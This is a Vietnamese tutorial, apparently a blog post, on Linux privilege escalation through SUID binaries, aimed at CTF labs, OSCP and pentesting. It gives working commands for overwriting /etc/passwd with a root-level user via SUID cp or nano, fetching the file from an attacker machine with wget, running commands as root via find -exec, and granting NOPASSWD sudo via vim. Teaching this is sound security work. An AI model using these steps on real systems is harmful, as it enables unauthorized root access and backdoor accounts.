## 0. Mở đầu
Trong nhiều chứng chỉ như OSCP, OSCE hay những lab pentesting như của [Vulnhub](https://www.vulnhub.com/), [Hackthebox](https://www.hackthebox.eu/) luôn có một phần rất rất quan trọng là chiếm **Root** của Server để có được flag. Điều này chứng tỏ rằng bạn đã hoàn toàn chinh phục được bài lab.
Đặt vào một hoàn cảnh thực tế hơn, trong quá trình Pentest, bạn có thể thực thi code (RCE) trên Server của target được pentest, mức ảnh hưởng sẽ thế nào nếu từ RCE, bạn có Full Permissions thông qua việc Privilege Escalation thành công ?

![](https://images.viblo.asia/f9453407-77a2-461d-bf14-fb31aeab77da.png)


Đây là bài thứ 2 trong series về [Linux Privilege Escalation](https://viblo.asia/s/linux-privilege-escalation-Wj53OQgw56m) của mình. Cũng là một dạng được sử dụng khá thường xuyên trong các cuộc thi, bài kiểm thử có yêu cầu về leo thang đặc quyền. 

## 1. Cơ sở lý thuyết: SUID - Set owner User ID up on execution


### 1.1 - Các quyền với file, thư mục trong Linux
Có bao giờ bạn install Project mới với Laravel, truy cập ngay và gặp thông báo như thế này (Permision denied):

![](https://images.viblo.asia/8a22e823-c6ae-46ee-8355-0a712e24d6d1.png)


Và bằng một cách nào đó, sau khi gõ lệnh: `chmod -R 777 storage/` thì trang Welcome của Laravel lại hiện ra một cách ngon lành?
Con số 777 kia nghĩa là gì? Hãy xem hình bên dưới để rõ hơn về quyền trong Linux:

![](https://images.viblo.asia/323dfbd5-3e9b-426f-b4cb-a227a8820921.png)

Con số 7 kia chính là số **bit** tối đa được sử dụng để đặt quyền của user đối với file, thư mục. Bao gồm: Read (4), Write (2) và Execute (1). 
Khi đặt 777, nó sẽ  là **rwxrwxrwx**. Hay 755 thì sẽ là: **rwxr-xr-x**. <Br>
Với lệnh `chmod -R 777 storage/` ở trên, mọi thư mục, file...trong **/storage/** đều có thể read, write, execute bởi bất cứ ai. Về cơ bản, bạn đã vô hiệu hóa tất cả các hình thức bảo mật với thư mục này  :kissing: . Khi full quyền, có thể tóm tắt như sau:

    
 ![](https://images.viblo.asia/2a182365-5a1d-4640-9c82-be8fa7765bd0.png)
    
    
1. **Dấu - hoặc d:** Dấu **-** chỉ ra đó là 1 file, chữ **d** chỉ ra đó là 1 thư mục
1. **User:** Quyền của user chủ sở hữu của file / thư mục này.
1. **Group:** Quyền của những users cùng group với  chủ sở  hữu file / thư mục này.
1. **Other:** Quyền của tất cả các user khác trên máy.

<br>

Để biết được file và directories đang được phân quyền như thế nào, các bạn gõ `ls -la` trên terminal.<br>
Đây là sự kết hợp của `ls -l` (use a long listing format) và `ls -a` (do not ignore entries starting with **.**). Điều này là quan trọng vì trong rất nhiều bài lab, các file ẩn thường chứa những thông tin quan trọng.

![](https://images.viblo.asia/417c500f-b689-4c7b-91c2-4f0174f4ca90.png)

### 1.2 - SUID, SGID và sticky bits
Như vậy các bạn có thể thấy, chúng ta có 3 quyền với 3 nhóm người dùng khác nhau. Tuy nhiên còn có 3 **special permission** với file, thư mục trong Linux, đó là **SUID, SGID** và **sticky bits**. Đương nhiên trong phạm vi bài viết, chúng ta sẽ tìm hiểu chủ yếu về việc leo thang đặc quyền với SUID. Tuy nhiên mình sẽ giới thiệu cơ bản về cả 2 permission kia.
    
#### 1.2.1 - SUID
SUID ( hay Set user ID ) , thường được sử dụng trên các file thực thi ( executable files ). Quyền này cho phép file được thực thi với các đặc quyền (privileges) của chủ sở hữu file đó.<br> Ví dụ: nếu một file được sở hữu bởi user **root**  và được set SUID bit, thì bất kể ai thực thi file, nó sẽ luôn chạy với các đặc quyền của user **root**. Và khi xem permissions của file, ở phần **User**, nhãn **x** sẽ được chuyển sang nhãn **s**.

![](https://images.viblo.asia/da51c46f-1b2c-41e5-9faa-c7605ee94433.png)
 
Để gán SUID cho 1 file, có 2 cách:<br>
`chmod u+s [tên file]` <br>
hoặc: <br>
`chmod 4555 [ tên file]   ( thêm 4 vào trước permissons )`

Lưu ý: Nếu file chưa có quyền thực thi (executing file as program), **SUID** sẽ là chữ **S**. Để nhãn **S** trở thành **s** bạn phải cấp quyền thực thi cho file, cũng có 2 cách: <br>
1. Chuột phải vào file chọn Properties, phần Permission tick vào **Allow executing file as program**.
    
    ![](https://images.viblo.asia/8d9598a8-48e6-470e-9649-99a4e78aa783.png)

  2. Cách 2 đơn giản hơn, chỉ gần gõ: `chmod u+x [tên file]`<br><br>
    Dưới đây là cách gán 1 SUID cho một file cụ thể tên **.burp** ( dùng **grep** đơn giản là mình lọc kết quả cho đỡ rối mắt ). Và từ **S** đã chuyển thành **s**. Gán SUID hoàn tất.
    
   ![](https://images.viblo.asia/6a6cb33c-cf7d-4c8e-9f55-9c4c5010ea90.png)
    
#### 1.2.2 - SGID
SGID ( hay Set group ID ) , cũng tương tự như SUID.  Quyền này cho phép file được thực thi với các đặc quyền (privileges) của group sở hữu file đó. Ví dụ: nếu một file thuộc sở hữu của **Staff** group, bất kể ai thực thi file đó, nó sẽ luôn chạy với đặc quyền của **Staff** group. <br>Và khi xem permissions của file, ở phần **Group**, nhãn **x** sẽ được chuyển sang nhãn **s**.
    
![](https://images.viblo.asia/1a9e1fe1-60d1-471a-b267-3f184c2ee826.png)

Để gán **SGID** cho 1 file, có 2 cách:<br>
 `chmod g+s [tên file]` <br>
hoặc: <br>
`chmod 2555 [ tên file]   ( thêm 2 vào trước permissons )`   
 
 Ngoài ra **SGID** có thể được gán cho thư mục. Với cách gán tương tự như gán cho một file. Khi **SGID** được gán cho 1 thư mục, tất cả các file được tạo ra trong thư mục đó sẽ kế thừa quyền sở hữu của **Group** đối với thư mục đó.
 #### 1.2.2 - Sticky Bit
 Được dùng cho các thư mục chia sẻ , mục đích là ngăn chặn việc người dùng này xóa file của người dùng kia . Chỉ duy nhất owner và root mới có quyền rename hay xóa các file, thư mục khi nó được set **Sticky Bit**. Đó là lý do nó còn được gọi là **restricted deletion bit**.<br>
 Điều này khá hữu ích trên các thư mục được set quyền **777** (mọi người đều được phép đọc và ghi / xóa). 
 
 ![](https://images.viblo.asia/7e90692f-060a-4dc4-af29-700ca32f7206.png)

 Khác một chút với 2 permission phía trên, ở **Sticky Bit**, nhãn **x** sẽ được chuyển thành nhãn **t**.<br>
Để gán **Sticky Bit** có 3 cách:<br>
    `chmod +t [tên file, thư mục]` <br> 
hoặc: <br>
    `chmod o+t [tên file, thư mục]` <br>
    hoặc: <br>
`chmod 1555 [ tên file,thư mục]   ( thêm 1 vào trước permissons )`   
    
   

-----




## 2 - Tìm Files có SUID
  Đây là câu lệnh quan trọng nhất của phần Privilege Escalation này, vậy nên cần hiểu kỹ.<br>
  Command:  `find / -perm -u=s -type f 2>/dev/null` <br>
    Trong đó:
* **/:** Tìm kiếm bắt đầu từ thư mục gốc (root) của hệ thống, việc này giúp quét toàn bộ files trong tất cả thư mục. Điều này giúp tăng phạm vi tìm kiếm. <br>
* **-perm:** Tìm kiếm theo các quyền được chỉ định sau đây. <br>
* **-u=s:** Tìm kiếm các file được sở hữu bởi người dùng root. Sử dụng -user [tên user] để tìm kiếm các files của user đó.<br>
* **-type**: chỉ định loại file tìm kiếm.<br>
* **f**: Chỉ định loại file cần tìm là các **regular file**, mà không là các thư mục hoặc các file đặc biệt. Hầu hết các file được sử dụng trực tiếp bởi người dùng là các regular file. Ví dụ: file thực thi, file văn bản, file hình ảnh... Điều này giúp tăng hiệu quả tìm kiếm.<br>
* **2>:** có nghĩa là redirect (kí hiệu là **>**)  **file channel** số **2** tới nơi được chỉ định,  **file channel** này ánh xạ tới **stderr (standard error file channel)**, là nơi các chương trình thường ghi lỗi vào.<Br>
* **/dev/null:** Đây là nơi được redirect đến, nó là một **pseudo-device** (thiết bị giả) hay một **special character device** mà nó cho phép write (ghi) bất cứ thứ gì lên nó, nhưng khi yêu cầu đọc nó, nó không return bất cứ thứ gì. 
    
Vậy câu lệnh trên sẽ tìm toàn bộ files có SUID của user root. Việc thêm `2>/dev/null` ý nghĩa rằng toàn bộ errors ( **file channel 2** ) trong quá trình chạy  sẽ được redirect tới **/dev/null** nhằm bỏ qua tất cả errors đó. Thế nên trong hình dưới kết quả nó mới được "gọn"  thế kia. :kissing:
    
   ![](https://images.viblo.asia/5682b3bb-f0ef-4910-999b-cc981fc48e1c.png)
 
 ## 3 - Privilege Escalation using SUID
 Thông thường trong các bài lab sử dụng method này, các **SUID** sẽ được gán cho các file/program/command với Owner có quyền cao hơn quyền của User khi chúng ta thâm nhập thành công vào bên trong. Nếu đó là Root, xin chúc mừng, game có vẻ dễ. Nhưng nếu là User khác, thì cũng xin chúc mừng, vì có vẻ bạn đang chơi game đúng hướng.<br><br>
Nếu bài lab có sử dụng method này để leo thang đặc quyền, khả năng cao sẽ là một trong số những trường hợp dưới đây, vì hiện tại đều đang khả dụng ! <br><br>
**Let's start !!!**

-----
    
  ### 3.1 - Khi SUID được gán cho Copy command 
   Sau khi RCE thành công, sử dụng câu lệnh tìm kiếm quen thuộc: `find / -perm -u=s -type f 2>/dev/null` <br>Command này dù là user vừa mới được tạo mới tinh cũng có thể thực thi :laughing:
    
 ![](https://images.viblo.asia/4f4f0860-2f51-453c-b242-1286a23a07be.png)
  
  Confirm lại lần nữa cho chắc: <br>
> which cp <br>
> ls -la /bin/cp

![](https://images.viblo.asia/6ef9bae0-9341-477d-8f01-c42c237aa6d8.png)

 Ok nó có SUID, ý tưởng ở đây là: Chúng ta sẽ copy file **/etc/passwd**. Nơi chứa rất nhiều thông tin nhạy cảm như thông tin của các user trên máy. Sử dụng copy, chúng ta sẽ chuyển nó đến thư mục web **/var/www/html**.
    Trên máy attacker, chúng ta dễ dàng truy cập, copy toàn bộ nội dung vào 1 file **text**. Tạo một user mới bằng cách sử dụng OpenSSL, gán quyền root cho user đó ( UID = 0 ), lưu vào cuối file **text**. Sau đó chuyển lại về máy victim ở thư mục **/tmp/** (thư mục mặc định, có toàn quyền để tạo hay xóa mọi file) . Cuối cùng là dùng copy để ghi đè lên file **passwd** thật.<br>
 <br>
   Command: `cp /etc/passwd /var/www/html`
    
   ![](https://images.viblo.asia/99287aac-3ab1-4e77-8249-17eeacfe351c.png)
    
  
Copy nội vào file text tên **passwd** và tạo một user mới:
    
    
   Command: `openssl passwd -1 -salt [salt value] {password}`
    
  ![](https://images.viblo.asia/60fd7b98-6f00-4bcc-8db3-75656c6b99cc.png)

Thêm user vào cuối file text trên, gán UID, GID:
    ![](https://images.viblo.asia/7fe95a23-09ec-4289-a2a0-1fc0df092a32.png)
    
Đưa file text vừa tạo ở máy attacker lên 1 "web server" sử dụng python2:
    
   Command: `python -m SimpleHTTPServer 8899`
    
    
Tại thư mục **/tmp/** ở máy victim, **wget** file text trên về:<br>
    Command: 
> cd /tmp <br>
    wget **IP:8899**/passwd<br>
    cp passwd /etc/passwd
 
   ![](https://images.viblo.asia/fe9c52e8-c685-4254-b22e-db05eb44271b.png)
  

   Kiểm tra xem đã ghi đè thành công chưa bằng cách đọc 3 dòng cuối của **/etc/passwd**
   <br>
    Command: `tail -n 3 /etc/passwd`
    
   ![](https://images.viblo.asia/7f385233-e30c-40b6-8b17-292b43580be2.png)
    
  Đến đây thì chỉ cần **su** (switch user) sang user3 và Get ROOT.

   ![](https://images.viblo.asia/02e70eef-b10e-4cd3-b492-9eee76a031f3.png)

  ### 3.2 - Khi SUID được gán cho Find command 
  
   Command: `find / -perm -u=s -type f 2>/dev/null` <br>
    Tại đây mình đã **grep find** để trả ra kết quả dễ nhìn hơn.
    
   ![](https://images.viblo.asia/bb44b249-509e-4184-8d75-13598a10a2dc.png)
   
  Với **find**, bạn không thể có được một Root shell, nhưng có thể thực thi mọi lệnh với tư cách root.<br>
    Command: 
>   touch anything<br>
    find anything -exec "command muốn thực thi" \;
   
![](https://images.viblo.asia/9994a05d-d466-476e-b056-4815cdc5019e.png)
    
  ### 3.3 - Khi SUID được gán cho Vim
    
  Command: ` find / -perm -u=s -type f 2>/dev/null| grep vim` <br>
  
   ![](https://images.viblo.asia/ecfedf17-4407-404a-b493-6be5dbe0c8d7.png)

Hãy đọc [phần 1](https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-0-using-sudo-rights-3Q75w8x2KWb) của mình về Privilege Escalation sử dụng Sudo Rights để hiểu hơn về method này. Tại đây khi Vim được gán SUID, chúng ta sẽ dùng nó để sửa đổi file **Sudoers.** <br>
   Command: `vim visudo ` <br>
   Edit :`username   ALL=(ALL) NOPASSWD:ALL`

    
![](https://images.viblo.asia/cf20957a-1148-49ba-8cc9-409da665f93a.png)
   
Và get ROOT:
   ![](https://images.viblo.asia/424e48e1-2317-4b54-a64d-6d2b2f9b4a60.png)
  
  ### 3.4 - Khi SUID được gán những script có sẵn
   Chuyện này có lẽ thường chỉ có trong những bài Lab ở mức độ easy, nơi owner tạo ra những đoạn script có sẵn dùng để get root shell. Cũng là một lưu ý khi gặp bài kiểu này, hãy thêm **| grep shell** hay **| grep root**, **grep |asroot** ...Nếu có, việc còn lại chỉ là chỉ là chạy script.
    
  ![](https://images.viblo.asia/688754c8-b07d-42bb-988e-328d0b456fb2.png)
    
 
 ### 3.5 - Khi SUID được gán cho Nano
   
  Phương thức cũng sẽ giống như ở phần copy, mục tiêu là chỉnh sửa file **/etc/passwd**. Nhưng với nano, mọi chuyện dễ dàng hơn nhiều. <br>
    Tạo user mới bằng openSSL như phía trên: `openssl passwd -1 -salt demo passwd123`
    
  ![](https://images.viblo.asia/cde94baf-969d-4015-9767-e41b1164cd44.png)

   Kiểm tra xem nano có được gán SUID không, nếu có thì thêm user vào /etc/passwd với đặc quyền root. <br>Command:<br>
  `find / -perm -u=s -type f 2>/dev/null | grep nano` <br>
                  `nano /etc/passwd`

  ![](https://images.viblo.asia/caf25d11-95f2-4375-a7e8-1674ed8ff9ef.png)

 Và get ROOT:
    ![](https://images.viblo.asia/80fbd8c8-1135-487b-baae-d131fa96b25f.png)

   ## 4. Ví dụ
   Trong bài CTF write-up [này](https://viblo.asia/p/efiens-ctf-2019-write-up-tu-sql-injection-toi-rce-va-get-root-oOVlYom4K8W),sau khi RCE thành công và tìm kiếm, nhận thấy có SUID time. Mình đã get Root thành công và có flag.
    
   ![](https://images.viblo.asia/b14918cc-cdea-4d05-a3a6-f9b57bc9b798.png)
    SUID time và time whoami trả về ID của root. Từ đó dễ dàng cat flag.
   
  ![](https://images.viblo.asia/269f4409-8651-4901-b041-d77f1d178648.png)
    
  Như vậy tùy vào SUID và ý đồ của tác giả mà mỗi bài lại có đôi chút khác biệt. Tuy nhiên về phương thức đều là sử dụng SUID. Hi vọng qua bài viết và quá trình làm lab, thi chứng chỉ hay pentest, nó có thể giúp ích cho các bạn.
   
  ## 5. Tài liệu tham khảo
   https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/ <br>
   https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/ <br>
   https://pentestlab.blog/2017/09/25/suid-executables/<br>
   https://gtfobins.github.io/